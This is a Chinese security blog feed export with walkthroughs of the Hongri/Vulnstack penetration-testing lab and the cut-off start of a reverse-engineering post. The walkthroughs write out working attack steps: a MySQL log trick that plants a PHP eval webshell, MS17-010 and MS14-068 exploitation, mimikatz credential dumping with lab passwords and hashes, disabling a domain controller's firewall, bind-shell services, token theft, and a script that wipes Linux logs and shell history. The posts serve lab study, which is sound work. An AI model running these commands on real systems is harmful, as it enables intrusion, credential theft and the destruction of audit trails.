exp</p></li><li><p>./exp   <img src="https://api2.mubu.com/v3/document_image/9024fa8f-6490-4dc7-a005-327dc52f9085-11763069.jpg" alt="img"></p></li><li><p>然后重新弹一个root的shell回去<img src="https://api2.mubu.com/v3/document_image/f4ed57f4-3e1a-4ea3-a860-73b56b6d6d84-11763069.jpg" alt="img"></p></li></ul></li></ul></li></ul></li><li><h3 id="四、内网横向"><a href="#四、内网横向" class="headerlink" title="四、内网横向"></a>四、内网横向</h3><ul><li><p>发现路由<img src="https://api2.mubu.com/v3/document_image/b28c7c9f-ca4e-4e0c-8588-57e88974b63a-11763069.jpg" alt="img"></p></li><li><p>添加路由 命令：run autoroute -s 192.168.183.0/24<img src="https://api2.mubu.com/v3/document_image/38f48706-40e6-48cd-8664-6e7ce274b3d5-11763069.jpg" alt="img"></p></li><li><p>开启socks代理</p><ul><li><p> use auxiliary/server/socks_proxy    </p></li><li><p>set srvhost 192.168.1.11</p></li><li><p>set version 4a socks版本   </p></li><li><p> run    </p></li></ul></li><li><p>信息收集 探测存存活主机</p><ul><li><p> use auxiliary/scanner/smb/smb_version </p></li><li><p>set rhosts 192.168.183.0/24</p></li><li><p>set timestampoutput 5 设置最大超时时间为5s</p></li><li><p>发现两个存活主机 以及域名demo<img src="https://api2.mubu.com/v3/document_image/2f519aad-d242-4911-9eae-591b24a81286-11763069.jpg" alt="img"></p></li></ul></li><li><p>探测主机存活端口</p><ul><li><p>use auxiliary/scanner/portscan/tcp</p></li><li><p>set ports 135,445,80,443,1433,3306,53,8080,8888,7001 # 将常用端口添加并扫描set rhosts 192.168.183.130-131    #探测两台服务器          </p></li><li><p>130开了53 135 445<img src="https://api2.mubu.com/v3/document_image/7f8093b1-0443-46c4-808d-bac29a695b28-11763069.jpg" alt="img"></p></li><li><p>131开了135 445<img src="https://api2.mubu.com/v3/document_image/171dfb79-66b7-4b37-a68f-01768149fc23-11763069.jpg" alt="img"></p></li><li><p>因为都开 了135 445  用永恒之蓝扫一波</p></li></ul></li><li><p>永恒之蓝</p><ul><li><p>use auxiliary/scanner/smb/smb_ms17_010</p></li><li><p>set payload windows/x64/meterpreter/bind_tcp              </p></li><li><p>set rhosts 192.168.183.130-131</p></li><li><p>run<img src="https://api2.mubu.com/v3/document_image/c7336ed3-1afe-4772-9b64-a5a27caed7da-11763069.jpg" alt="img"></p></li><li><p>看样子两台都可能有  先打131</p><ul><li>这里图贴错了 不影响</li></ul></li><li><p>拿下131<img src="https://api2.mubu.com/v3/document_image/fbca5c61-d359-45a5-99cc-b371f00ec2a4-11763069.jpg" alt="img"></p></li><li><p>开始域内信息收集:<img src="https://api2.mubu.com/v3/document_image/b6a67bf2-9f20-497f-a955-e3d7c72a1924-11763069.jpg" alt="img"></p></li><li><p>但执行域内信息收集的时候出现问题  一直报错<img src="https://api2.mubu.com/v3/document_image/1159a092-435c-41b3-83ee-fa2dace1d80e-11763069.jpg" alt="img"></p></li><li><p>通过问志哥发现  说是当前用户不在域内 换一个用户收集</p></li><li><p>通过systeminfo发现当前是pc机  还有一个机器应该就是域控<img src="https://api2.mubu.com/v3/document_image/9784e981-e4a2-4388-ab0a-badc7b59574a-11763069.jpg" alt="img"></p></li><li><p>先进行进程迁移到一个域用户<img src="https://api2.mubu.com/v3/document_image/b65c4c1e-059b-4a1d-ace3-dac986593164-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/9732fc4a-b7ba-449e-9899-8a14524ce3cd-11763069.jpg" alt="img"></p></li><li><p>迁移成功</p></li><li><p>现在就能成功进行相关的域信息收集<img src="https://api2.mubu.com/v3/document_image/c7a82ae6-f7c8-4cbf-b198-8ccd2e75c46f-11763069.jpg" alt="img"></p></li><li><p>找到域控机器<img src="https://api2.mubu.com/v3/document_image/c26457a2-9757-4cf1-bcbb-b6837c848586-11763069.jpg" alt="img"></p></li><li><p>ip 192.168.183.130</p></li><li><p> DC机器名：<a href="http://win-ens2vr5tr3n.demo.com/">WIN-ENS2VR5TR3N.demo.com</a>      </p></li><li><p> 域管用户 administrator                      </p></li><li><p>域用户sid</p><ul><li>demo\douser S-1-5-21-979886063-1111900045-1414766810-1107</li></ul></li><li><p>切换回高权限  然后用kiwi抓取密码<img src="https://api2.mubu.com/v3/document_image/cb954d28-1f29-4877-a7cd-2d8cd9c9ae64-11763069.jpg" alt="img"></p></li><li><p>抓取到了域用户的明文密码和hash 但是没有抓到域管的</p><ul><li>douser:Dotest123ntml:bc23b0b4d5bf5ff42bc61fb62e13886e sha1:c48096437367aad00ac2dc70552051cd84912a55      </li></ul></li><li><p>  使用smb连接了 但是无法执行命令<img src="https://api2.mubu.com/v3/document_image/0f41dfd0-67b9-44e2-b16e-49b639e4256f-11763069.jpg" alt="img"></p></li><li><p>所以利用ms14-068域内漫游</p></li><li><p>切换到域用户然后上传exe </p></li><li><p>然后执行 利用ms14-068生成票据：               ms14-068.exe -u <a href="mailto:&#100;&#111;&#117;&#115;&#101;&#114;&#64;&#x64;&#x65;&#x6d;&#x6f;&#x2e;&#99;&#111;&#109;">&#100;&#111;&#117;&#115;&#101;&#114;&#64;&#x64;&#x65;&#x6d;&#x6f;&#x2e;&#99;&#111;&#109;</a> -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130 -p Dotest123          <img src="https://api2.mubu.com/v3/document_image/be7b8f35-6263-4f0a-ba28-102392b12289-11763069.jpg" alt="img"></p></li><li><p>​    然后利用mimiaktz将凭据导入内存<img src="https://api2.mubu.com/v3/document_image/491d3c22-f25e-4712-94dd-714749e16453-11763069.jpg" alt="img"></p></li><li><p>这里需要先清除目标的凭据</p><ul><li><p>mimikatz # kerberos::purge         //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</p></li><li><p>mimikatz # kerberos::list          //查看当前机器凭证</p></li><li><p>mimikatz # kerberos::ptc &lt;生成的票据文件&gt;   //将票据注入到内存中</p></li></ul></li><li><p>mimikatz # kerberos::ptc <a href="mailto:&#x54;&#x47;&#x54;&#x5f;&#x64;&#111;&#x75;&#x73;&#x65;&#114;&#64;&#x64;&#101;&#x6d;&#111;&#46;&#99;&#111;&#109;&#x2e;&#x63;&#99;&#97;&#x63;&#104;&#101;">&#x54;&#x47;&#x54;&#x5f;&#x64;&#111;&#x75;&#x73;&#x65;&#114;&#64;&#x64;&#101;&#x6d;&#111;&#46;&#99;&#111;&#109;&#x2e;&#x63;&#99;&#97;&#x63;&#104;&#101;</a>              </p></li><li><p>然后dir \<a href="http://win-ens2vr5tr3n.demo.com/">WIN-ENS2VR5TR3N.demo.com</a>\c$<img src="https://api2.mubu.com/v3/document_image/a2a8fd70-b98e-4460-8762-fb9be9f61072-11763069.jpg" alt="img"></p></li><li><p>凭据生效</p></li></ul></li><li><p>漫游DC</p><ul><li><p>先生成一个正向的shell 上传到pc win7上  然后copy到dc上<img src="https://api2.mubu.com/v3/document_image/a4d02b57-33f6-4c4f-8dc3-d6b489721ffb-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/16d1dde2-d344-4de4-9e35-f09ea9d3e835-11763069.jpg" alt="img"></p></li><li><p>关闭dc防火墙</p></li><li><p>sc \WIN-ENS2VR5TR3N create unablefirewall binpath= “netsh advfirewall set allprofiles state off”</p></li><li><p>sc \WIN-ENS2VR5TR3N start unablefirewall<img src="https://api2.mubu.com/v3/document_image/7b4eb2f7-067d-4578-bd14-fdcd50a258e0-11763069.jpg" alt="img"></p></li><li><p>然后将bind.exe传到dc<img src="https://api2.mubu.com/v3/document_image/c8ad58eb-d16a-420f-ae88-0213d8ad38b0-11763069.jpg" alt="img"></p></li><li><p>msf创建监听<img src="https://api2.mubu.com/v3/document_image/1379641e-1bd1-4ddd-965b-c6f94d0fcadc-11763069.jpg" alt="img"></p></li><li><p>创建服务执行msf马：</p><ul><li> sc \<a href="http://win-ens2vr5tr3n.demo.com/">WIN-ENS2VR5TR3N.demo.com</a> create shell binpath= “c:\bind.exe”    创建执行正向shell的进程sc \<a href="http://win-ens2vr5tr3n.demo.com/">WIN-ENS2VR5TR3N.demo.com</a> start shell        启动可以执行正向shell的服务       </li></ul></li><li><p>不知道是我的操作问题 还是环境问题 我一直出毛病</p></li><li><p>最后始终连不上       <img src="https://api2.mubu.com/v3/document_image/6ae49381-98a3-4f66-a260-a9c76f20f010-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/1722bc09-2e1c-4cf3-840a-ca056b9c6fe5-11763069.jpg" alt="img"></p></li><li><p>后面的操作 也没多难 执行拿下dc 抓hash 抓密码等 就不继续操作了</p></li></ul></li></ul></li><li><h3 id="五、痕迹清理"><a href="#五、痕迹清理" class="headerlink" title="五、痕迹清理"></a>五、痕迹清理</h3><ul><li><p>Linux</p><ul><li><p>清除命令历史记录</p></li><li><p>histroy -r          #删除当前会话历史记录</p></li><li><p>history -c          #删除内存中的所有命令历史</p></li><li><p>rm .bash_history   #删除历史文件中的内容</p></li><li><p>HISTZISE=0          #通过设置历史命令条数来清除所有历史记录</p></li><li><p>在隐蔽的位置执行命令</p></li><li><p>使用vim打开文件执行命令</p></li><li><p>:set history=0</p></li><li><p>:!command</p></li><li><p>linux日志文件</p></li><li><p>/var/run/utmp 记录现在登入的用户</p></li><li><p>/var/log/wtmp 记录用户所有的登入和登出</p></li><li><p>/var/log/lastlog 记录每一个用户最后登入时间</p></li><li><p>/var/log/btmp 记录错误的登入尝试</p></li><li><p>/var/log/auth.log 需要身份确认的操作</p></li><li><p>/var/log/secure 记录安全相关的日志信息</p></li><li><p>/var/log/maillog 记录邮件相关的日志信息</p></li><li><p>/var/log/message 记录系统启动后的信息和错误日志</p></li><li><p>/var/log/cron 记录定时任务相关的日志信息</p></li><li><p>/var/log/spooler 记录UUCP和news设备相关的日志信息</p></li><li><p>/var/log/boot.log 记录守护进程启动和停止相关的日志消息</p></li><li><p>完全删除日志文件：</p></li><li><p>cat /dev/null &gt; filename</p></li><li><p>: &gt; filename</p></li><li><p>&gt; filename</p></li><li><p>echo “” &gt; filename</p></li><li><p>echo &gt; filename</p></li><li><p>针对性删除日志文件：</p></li><li><p>删除当天日志</p></li><li><p>sed  -i ‘/当天日期/‘d  filename</p></li><li><p>一键清除脚本：</p></li><li><p>#!/usr/bin/bash</p></li><li><p>echo &gt; /var/log/syslog</p></li><li><p>echo &gt; /var/log/messages</p></li><li><p>echo &gt; /var/log/httpd/access_log</p></li><li><p>echo &gt; /var/log/httpd/error_log</p></li><li><p>echo &gt; /var/log/xferlog</p></li><li><p>echo &gt; /var/log/secure</p></li><li><p>echo &gt; /var/log/auth.log</p></li><li><p>echo &gt; /var/log/user.log</p></li><li><p>echo &gt; /var/log/wtmp</p></li><li><p>echo &gt; /var/log/lastlog</p></li><li><p>echo &gt; /var/log/btmp</p></li><li><p>echo &gt; /var/run/utmp</p></li><li><p>rm ~/./bash_history</p></li><li><p>history -c</p></li></ul></li><li><p>Windows</p><ul><li><p>1.查看事件日志run event_manager -i</p></li><li><p>2.删除事件日志run event_manager -c</p></li><li><p>3.clearv命令清除目标系统的事件日志。</p></li></ul></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>红日靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场</tag>
      
      <tag>内网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日1</title>
    <link href="/2021/10/30/%E7%BA%A2%E6%97%A51/"/>
    <url>/2021/10/30/%E7%BA%A2%E6%97%A51/</url>
    
    <content type="html"><![CDATA[<ul><li><h3 id="概念图"><a href="#概念图" class="headerlink" title="概念图"></a>概念图</h3></li><li><p><img src="https://api2.mubu.com/v3/document_image/ce7ddd3f-7c6b-4763-81dc-928d373c4210-11763069.jpg" alt="img"></p></li><li><p>靶场环境  win7 是web服务器  2003 是域成员   2008是域控</p></li><li><p>添加一个网卡<img src="https://api2.mubu.com/v3/document_image/1110999a-0830-44ce-9843-fed59fcd7e34-11763069.jpg" alt="img"></p></li><li><p>win7是双网卡 一个桥接  一个52网段的网卡 另外两个都是52网段的网卡</p></li><li><h3 id="实验开始"><a href="#实验开始" class="headerlink" title="实验开始"></a>实验开始</h3><ul><li><p>输入web服务器ip  打开是一个php探针页面</p><ul><li><p>通过这个页面可以 看到绝对路径 服务器信息  搭建的phpstydy版本  以及可以在最下面进行mysql数据库的连接测试<img src="https://api2.mubu.com/v3/document_image/e08519a6-4bc3-494a-96d6-7c111e5329af-11763069.jpg" alt="img"></p></li><li><p>发现是php探针  就会联想到 phpmyadmin  一般这种是联合搭配的  直接在页面输入phpmyadmin进行测试<img src="https://api2.mubu.com/v3/document_image/b3f4e125-46b9-449a-8be5-9522e80f0b76-11763069.jpg" alt="img"></p></li><li><p>直接进到phpmyadmin界面  然后就可以用 弱口令进行测试 root  root<img src="https://api2.mubu.com/v3/document_image/10d6950b-de02-403a-89f3-8fde81b901f7-11763069.jpg" alt="img"></p></li><li><p>进到phpmyadmin里面 我们就可以通过phpmyadmin拿webshell了</p></li><li><p>先直接通过mysql 试试导入一句话</p></li><li><p>执行之后发现报错<img src="https://api2.mubu.com/v3/document_image/52a584a1-0f7b-4148-8f88-3eab30103256-11763069.jpg" alt="img"></p></li><li><p>然后翻译一下报错信息<img src="https://api2.mubu.com/v3/document_image/bac7ea1e-9123-4f3d-86a9-1d25df775ccf-11763069.jpg" alt="img"></p></li><li><p>发现是secure file priv  然后使用命令查看一下secure的设置<img src="https://api2.mubu.com/v3/document_image/2c9eaf0e-f235-44b8-9b5a-ce9e3230bfd4-11763069.jpg" alt="img"></p></li><li><p>发现secure file priv   是null  上面是off   这样设置是不允许导入文件的 只能读  所以我们可以尝试写全局日志的方式进行getshell</p></li><li><p>先用命令查看日志的配置 show global variables like ‘%general_%’<img src="https://api2.mubu.com/v3/document_image/297a0451-f640-4b43-b322-2783ea9101e4-11763069.jpg" alt="img"></p></li><li><p>可以看到 全局日志是关闭的  和全局日志的记录位置   所以接下来就需要将全局日志打开  然后将路径也改了</p></li><li><p>打开日志 命令：set global general_log = on<img src="https://api2.mubu.com/v3/document_image/b28974fa-554e-44a2-ad8f-19ac1cd77f16-11763069.jpg" alt="img"></p></li><li><p>修改路径 命令 set global general_log_file = ‘C:/phpStudy/WWW/hack.php’<img src="https://api2.mubu.com/v3/document_image/6c5b95c7-2aba-4afe-b47f-62b3044d0c65-11763069.jpg" alt="img"></p></li><li><p>然后进行一句话写入 命令 ： select “<?php eval($_POST['cmd']);?>“<img src="https://api2.mubu.com/v3/document_image/6d8dac8b-e137-417b-b077-3a05ba03afcb-11763069.jpg" alt="img"></p></li><li><p>然后打开靶机看一看 效果<img src="https://api2.mubu.com/v3/document_image/97e6c4fb-bba0-48d0-b0dc-7a44a13c760a-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/f9159448-e645-4ace-b245-b54d51bb0cc4-11763069.jpg" alt="img"></p></li><li><p>一句话成功写入  打开蚁剑 进行连接<img src="https://api2.mubu.com/v3/document_image/8420c81d-6725-4fc4-b4c5-b193ba3b7058-11763069.jpg" alt="img"></p></li><li><p>成功连接   webshell 拿下</p></li><li><p>发现还有一个yxcms的 应该是有一个页面的  用浏览器打开<img src="https://api2.mubu.com/v3/document_image/55db3e09-09e5-4d80-9a0f-9b5c41f38d31-11763069.jpg" alt="img"></p></li><li><p>因为是靶场的缘故 直接告诉了后台地址和用户账号密码  正常情况下 是没有这些的 需要通过常规的渗透手段 进行获取  因为有了地址和密码 就直接登录后台<img src="https://api2.mubu.com/v3/document_image/b0f83ce1-4942-4b04-8560-ab0c84f9d0c1-11763069.jpg" alt="img"></p></li><li><p>然后首先就是看看有什么地方可以getshell</p></li><li><p>发现sql执行   root权限  就可以和上面一样  试试直接写入一句话  或者 用全日志写入一句话<img src="https://api2.mubu.com/v3/document_image/64bf056a-e3c2-4f21-9904-6dcfc5c71b73-11763069.jpg" alt="img"></p></li><li><p>在看看其他地方  发现模板<img src="https://api2.mubu.com/v3/document_image/fcea861a-e446-40d9-b2a8-0e1b97627f01-11763069.jpg" alt="img"></p></li><li><p>这里我们可以修改一个模板 插入一句话  或者新建一个  插入大马 或小马行</p></li><li><p>新建一个小马<img src="https://api2.mubu.com/v3/document_image/948c4052-a354-4339-861c-dfde7471bcd3-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/473ea7ad-e557-4a19-835c-806d71e0ce1f-11763069.jpg" alt="img"></p></li><li><p>模板创建好后  接下来的问题就是 找到路径</p></li><li><p>在后台 发现无法找到路径   换个思路 通过御剑扫描目录 看看有木有新发现<img src="https://api2.mubu.com/v3/document_image/ac872fa7-ac81-4a78-a3b4-ee8b86216b9f-11763069.jpg" alt="img"></p></li><li><p>发现一个目录遍历  然后可以查看目录 找到 创建的模板路径<img src="https://api2.mubu.com/v3/document_image/284c8ff1-65c2-4f0d-adab-2c8d54cd6463-11763069.jpg" alt="img"></p></li><li><p>直接扫描域名   发现有备份文件  也可以直接下载备份文件 查找路径<img src="https://api2.mubu.com/v3/document_image/1e56a8fe-1211-4420-88e9-0a49c21cda31-11763069.jpg" alt="img"></p></li><li><p>找到路径之后 直接用蚁剑进行连接<img src="https://api2.mubu.com/v3/document_image/8d56995b-2491-4075-83fa-394a97663b95-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/d250eb4a-cf09-4c4f-ae20-e74e11b3ef4e-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/a2b2522a-b0de-4690-bcb2-11e845dd6fa8-11763069.jpg" alt="img"></p></li><li><p>这样 也可以getshell</p></li><li><p>拿下webshell执行 就该进行内网渗透</p></li></ul></li><li><h3 id="内网实现"><a href="#内网实现" class="headerlink" title="内网实现"></a>内网实现</h3><ul><li><p>发现权限是administrator 权限挺高 就不需要提权了  然后是Windows系统  可以结合cs 上线操作<img src="https://api2.mubu.com/v3/document_image/59de277b-f641-4f8e-847d-69f903b282ab-11763069.jpg" alt="img"></p></li><li><p>打开cs  生成一个后门<img src="https://api2.mubu.com/v3/document_image/7a6004da-af1d-4acf-aabc-024e545c7f66-11763069.jpg" alt="img"></p></li><li><p>然后将它传上去   <img src="https://api2.mubu.com/v3/document_image/ed745ad7-ee29-42ab-a275-90240a5bfa97-11763069.jpg" alt="img"></p></li><li><p>然后执行上线<img src="https://api2.mubu.com/v3/document_image/f3ebeb09-d149-4a1c-9195-95a68598723d-11763069.jpg" alt="img"></p></li><li><p>上线之后 第一步 还是先把延时设置为0<img src="https://api2.mubu.com/v3/document_image/44e63cae-0534-4579-bf32-a9c0a07ffd0e-11763069.jpg" alt="img"></p></li><li><p>然后就可以直接用cs 进行目标的信息收集  例如收集目标打的补丁<img src="https://api2.mubu.com/v3/document_image/b921bdd5-72b1-4c00-ab9c-fb28c621b123-11763069.jpg" alt="img"></p></li><li><p>打了4个补丁  然后就可以随便上exp打 就行了</p></li><li><p>抓取密码   直接发现是明文密码<img src="https://api2.mubu.com/v3/document_image/b34f3131-1c07-4802-a2c4-d64322398d9f-11763069.jpg" alt="img"></p></li><li><p>logonpasswords #拖取明文密码与NMTL票据              </p></li><li><p>NTLM  也可以直接去md5解密<img src="https://api2.mubu.com/v3/document_image/2883c5f0-1d89-4df7-94e9-ce41ee9f279c-11763069.jpg" alt="img"></p></li><li><p>又因为是administrator权限 可以直接创建用户 然后直接用cs 开启3389  <img src="https://api2.mubu.com/v3/document_image/1083ea47-fc3d-4489-a0d5-0ba4f1a1942e-11763069.jpg" alt="img"></p></li><li><p>然后进行连接  可以直接连接<img src="https://api2.mubu.com/v3/document_image/50e6285d-23e8-4eeb-9ac7-b7b23ba02c33-11763069.jpg" alt="img"></p></li><li><p>另外 也可以通过msf 联动配合   cs和msf联动的时候  cs需要新建一个监听器<img src="https://api2.mubu.com/v3/document_image/2d4dea48-eeba-445e-b62b-2fcad49b9d80-11763069.jpg" alt="img"></p></li><li><p>然后设置msf<img src="https://api2.mubu.com/v3/document_image/dc82f881-261f-4e87-b6f9-d23eb61ce0bf-11763069.jpg" alt="img"></p></li><li><p>这里是重点 需要用http才行</p></li><li><p>然后用cs新建会话  选择设置的MSF监听器<img src="https://api2.mubu.com/v3/document_image/aadd83b3-fa03-4405-9437-637a7b599add-11763069.jpg" alt="img"></p></li><li><p>然后msf这边会话就弹回来了<img src="https://api2.mubu.com/v3/document_image/bb11c633-d62a-43d6-8b06-1e9f28e7f689-11763069.jpg" alt="img"></p></li><li><p>然后用msf自带的模块 直接提升为system权限  命令  getsystem<img src="https://api2.mubu.com/v3/document_image/2bcc9ed2-f30b-4f97-81e3-b659bf0926f5-11763069.jpg" alt="img"></p></li><li><p>还是先通过arp -a  查看一下网段情况  发现还有 两台机器<img src="https://api2.mubu.com/v3/document_image/339024c8-c94c-4c52-8f4f-7769eba83f75-11763069.jpg" alt="img"></p></li><li><p>因为那两台是存在内网的  所以之后的操作 就需要先设置路由来操作</p></li><li><p>设置路由 命令 run autoroute -s 192.168.52.0/24<img src="https://api2.mubu.com/v3/document_image/458853d2-d404-4686-9ed3-16465f20167a-11763069.jpg" alt="img"></p></li><li><p>然后查看路由添加情况 命令 run autoroute -p<img src="https://api2.mubu.com/v3/document_image/b058d8ac-6c2f-4f6c-a6b2-038433658370-11763069.jpg" alt="img"></p></li><li><p>用模块扫描一下存活的主机 命令 run post/windows/gather/arp_scanner rhosts=192.168.52.0/24</p><ul><li>143 是web服务器的  已经被拿下</li></ul></li><li><p>接下来就是拿下另外两台  先将会话挂起 然后就需要进行socks代理 拿下另外两台</p></li><li><p>命令 use auxiliary/server/socks_proxy <img src="https://api2.mubu.com/v3/document_image/9648065f-048b-4b67-a85d-60557e35906b-11763069.jpg" alt="img"></p></li><li><p>配置相关设置<img src="https://api2.mubu.com/v3/document_image/246c6cb4-c913-4bb8-9f94-948f73259d63-11763069.jpg" alt="img"></p></li><li><p>然后查看配置文件是否一致 命令 vim /etc/proxychains4.conf <img src="https://api2.mubu.com/v3/document_image/509197c8-7ffe-4d57-8e1f-cdff5897190d-11763069.jpg" alt="img"></p></li><li><p>然后 扫描端口 proxychains nmap -sT -Pn -T4 192.168.52.141</p></li><li><p>这里也可以通过cs自带的portscan模块  端口扫描 进行端口探测<img src="https://api2.mubu.com/v3/document_image/500814ec-c5fd-471c-9246-0ce1150e533d-11763069.jpg" alt="img"></p></li><li><p>然后发现都打开了445端口  这里就推测有有m17010  但是发现利用失败  换一种m17010的使用方法  添加账户的方法</p></li><li><p>命令 use auxiliary/admin/smb/ms17_010_command <img src="https://api2.mubu.com/v3/document_image/208162fb-baad-4a87-ad3b-ec2ba13d5d0c-11763069.jpg" alt="img"></p></li><li><p><img src="https://api2.mubu.com/v3/document_image/f9d56611-aa1c-4599-acd6-6a71ec80bcdf-11763069.jpg" alt="img"></p></li><li><p>然后设置相关配置  设置添加的账户和密码  密码需要复杂点 不然 过不了规则<img src="https://api2.mubu.com/v3/document_image/f91a5942-ceb1-42a9-b6f3-940c9b6a99f1-11763069.jpg" alt="img"></p></li><li><p>然后将创建的用户 添加到管理组 命令  set COMMAND net localgroup administrators hack /add<img src="https://api2.mubu.com/v3/document_image/fa1d9156-5df2-475a-bc64-8c1f365d81aa-11763069.jpg" alt="img"></p></li><li><p><img src="https://api2.mubu.com/v3/document_image/37b6b0de-43ed-4980-896a-d0ef52633712-11763069.jpg" alt="img"></p></li><li><p>域成员拿下</p></li><li><p>域控</p></li><li><p>开始进行对域控的渗透  上面利用cs对端口进行了扫描  打开了445 端口 直接用msf的模块测试</p></li><li><p>命令：use auxiliary/scanner/smb/smb_ms17_010</p></li><li><p> msf6 auxiliary(scanner/smb/smb_ms17_010) &gt;  set rhost 192.168.52.138<img src="https://api2.mubu.com/v3/document_image/2e20d943-81da-41f8-901b-bed142768443-11763069.jpg" alt="img"></p></li><li><p>直接开打</p></li><li><p>利用搜索模块 命令 search ms17_010<img src="https://api2.mubu.com/v3/document_image/1a3079bc-f715-445d-b399-fa3a4ce2f35a-11763069.jpg" alt="img"></p></li><li><p>我们用第一个</p></li><li><p>命令：use auxiliary/admin/smb/ms17_010_command </p></li><li><p>然后将创建的用户 添加到管理组 命令  set COMMAND net user hack1 bhanquan@2021 /add</p></li><li><p>然后exploit开打<img src="https://api2.mubu.com/v3/document_image/c75a4383-1e3a-46a3-a7c4-b218b6b31c7d-11763069.jpg" alt="img"></p></li><li><p>然后将 用户添加到管理组 命令 ：set COMMAND net localgroup administrators hack /add</p></li><li><p>然后exploit</p></li><li><p>然后查看添加是否成功 命令set COMMAND net localgroup administrators<img src="https://api2.mubu.com/v3/document_image/f8044348-e749-442e-97a4-ee145d3ca4d2-11763069.jpg" alt="img"></p></li><li><p>添加成功</p></li></ul></li><li><p>另外操作(不太熟练 有点懵)</p><ul><li><p>在上面已经通过cs抓到了 域管的密码   和通过msf 用ms17 010 创建了账户</p></li><li><p>然后用cs  的  SMB Beacon操作</p><ul><li>SMB Beacon 使用命名管道通过父级 Beacon 进行通讯，当两个 Beacons 链接后，子 Beacon 从父 Beacon 获取到任务并发送。因为链接的 Beacons 使用 Windows 命名管道进行通信，此流量封装在 SMB 协议中，所以 SMB Beacon 相对隐蔽，绕防火墙时可能发挥奇效</li></ul></li><li><p>在已有的 beacon 上创建监听，用来作为跳板进行内网穿透</p></li><li><p>前提是能够通过 shell 之类访问到内网其他主机</p></li><li><p>psexec 使用凭证登录其他主机</p></li><li><p>前面横向探测已经获取到内网内的其他 Targets 以及读取到的凭证信息</p></li><li><p>于是可以尝试使用 psexec 模块登录其他主机</p></li><li><p>右键选择一台非域控主机 ROOT-TVI862UBEH 的 psexec 模块：<img src="https://api2.mubu.com/v3/document_image/d0d29ddd-99e7-4e74-b517-d20c989b4a76-11763069.jpg" alt="img"></p></li><li><p>在弹出的窗口中选择使用 god.org 的 Administrator 的凭证信息</p></li><li><p>监听器选择刚才创建的 smb beacon，会话也选择对应的 smb beacon 的会话：<img src="https://api2.mubu.com/v3/document_image/50f3ab12-a09b-4c06-a877-8f24c827ec3d-11763069.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/4e576afb-7928-46ff-926c-e9bd456cb772-11763069.jpg" alt="img"></p></li><li><p>执行后效果如下：<img src="https://api2.mubu.com/v3/document_image/175adf88-e1fb-4e9e-960e-a4d251a441eb-11763069.jpg" alt="img"></p></li><li><p>之后的OWA 也是相同的办法</p></li><li><p>最终的图示图<img src="https://api2.mubu.com/v3/document_image/ecadb6f6-6a53-4fc7-a45e-251c8c041646-11763069.jpg" alt="img"></p></li><li><p>toke窃取</p><ul><li><p>除了直接使用获取到的 hash 值，也可以直接窃取 GOD\Administrator 的 token 来登录其他主机</p></li><li><p>选择 beacon 右键 -&gt; 目标 -&gt; 进程列表</p></li><li><p>选择 GOD\Administrator 的 token 盗取：<img src="https://api2.mubu.com/v3/document_image/25f073c7-3474-4b81-ae0a-14ea3f181a69-11763069.jpg" alt="img"></p></li><li><p>然后在选择令牌处勾选使用当前 token 即可：<img src="https://api2.mubu.com/v3/document_image/5f59abac-ac17-421a-95eb-cacebdf49cf7-11763069.jpg" alt="img"></p></li><li><p>效果和前面是一样的</p></li><li><p>之后就可以开3389 什么的 进行远程连接</p></li></ul></li></ul></li></ul></li><li><p>参考：<a href="https://soapffz.com/sec/558.html#menu_index_15">https://soapffz.com/sec/558.html#menu_index_15</a></p></li><li><p>参考：<a href="https://www.cooyf.com/bj/vulnstack1.html#toc_8">https://www.cooyf.com/bj/vulnstack1.html#toc_8</a></p><ul><li><p><a href="https://www.freebuf.com/column/231111.html">https://www.freebuf.com/column/231111.html</a></p></li><li><p><a href="https://www.hacksafe.net/articles/web/4463.html">https://www.hacksafe.net/articles/web/4463.html</a></p></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>红日靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场</tag>
      
      <tag>内网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>简单逆向分析1</title>
    <link href="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/"/>
    <url>/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/</url>
    
    <content type="html"><![CDATA[<blockquote><p>程序效果</p></blockquote><blockquote><p>输入一串字符串  然后输出key right或者error</p></blockquote><p><img src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/1.png" alt="1"></p><blockquote><p>内部肯定是进行了判断  因为这里打印了 字符 我们可以直接通过这些关键词 来搜寻到 函数的入口</p></blockquote><blockquote><p>在od里面</p></blockquote><p><img src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/2.png" alt="2"></p><p><img src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/3.png" alt="3"></p><blockquote><p>然后回车进去</p></blockquote><p><img src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/4.png" alt="4"></p><p>看到error了  也看到right了  那应该是找对了  然后往上翻 找到函数的入口  F2打上断点  执行到这</p><p><img src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/5.png" alt="5"></p><blockquote><p>初步分析   这里定义了5个局部变量</p></blockquote><blockquote><p>然后add esp在call后面  这应该就是外平栈   cdecl   push传参</p></blockquote><p><img src="/2021/10/30/%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%901/6.png" alt="6"></p><blockquote><p>然后看下面这个call    push了2次  然后在call的后面 外平栈 0x8 那应该是 只传了这两个参数</p></blockquote><p><img 